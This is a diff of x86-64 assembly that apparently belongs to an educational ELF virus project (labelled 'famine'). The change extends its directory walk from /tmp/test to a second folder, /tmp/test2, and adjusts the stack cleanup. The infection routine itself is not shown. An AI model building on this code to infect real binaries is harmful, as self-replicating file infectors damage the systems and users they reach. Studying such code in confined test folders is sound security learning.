@@ -27,11 +27,10 @@
 %define argv0			[rsp + 8]
 %define argc			[rsp + 4]
 %define SIGNATURE		0x00455244
-
 %define PF_X	1
 %define PF_R	4
 
-; ***  r15 offsets****
+; ***  r15 offsets ****
 ; 0 = stack buffer = stat
 ; 48 = stat.st_size
 
@@ -60,7 +59,7 @@
 ; 416 = dirent.d_reclen
 ; 418 = dirent.d_type
 ; 419 = dirent.d_name
-
+; 500 = first folder
 section .text
 	global _start
 _start:
@@ -69,11 +68,16 @@ _start:
     push rsp
     sub rsp, 5000                                               ; reserving 5000 bytes
     mov r15, rsp  
+	mov byte [r15 + 550], 0
 	call set_folder_chdir
 	chdir:
 		pop rdi
 		mov rax, SYS_CHDIR
 		syscall
+	cmp byte [r15 + 550], 0
+	je .test1
+	jmp set_folder2
+.test1:
 	call set_folder ;/tmp/test
 	dirent:
 		pop rdi
@@ -265,8 +269,10 @@ _start:
 			add cx, word [rcx + r15 + 416]
 			cmp rcx, qword [r15 + 350]
 			jne for_each_file
-
-		jmp cleanup
+		cmp byte [r15 + 550], 0
+		jne cleanup
+		mov byte [r15 + 550], 1
+		jmp set_folder_chdir2
 set_folder:
 	call dirent
 	db "/tmp/test", 0
@@ -274,6 +280,9 @@ set_folder_chdir:
 	call chdir
 	db `/tmp/test\0`
 set_folder2:
+	call dirent
+	db `/tmp/test2\0`
+set_folder_chdir2:
 	call chdir
 	db `/tmp/test2\0`
 famine:
@@ -283,7 +292,7 @@ err:
 	mov rdi, 0xfffffff
 	syscall
 cleanup:
-    add rsp, 5008       ; restoring stack 
+    add rsp, 5000       ; restoring stack 
     pop rsp
     pop rdx
 _end:
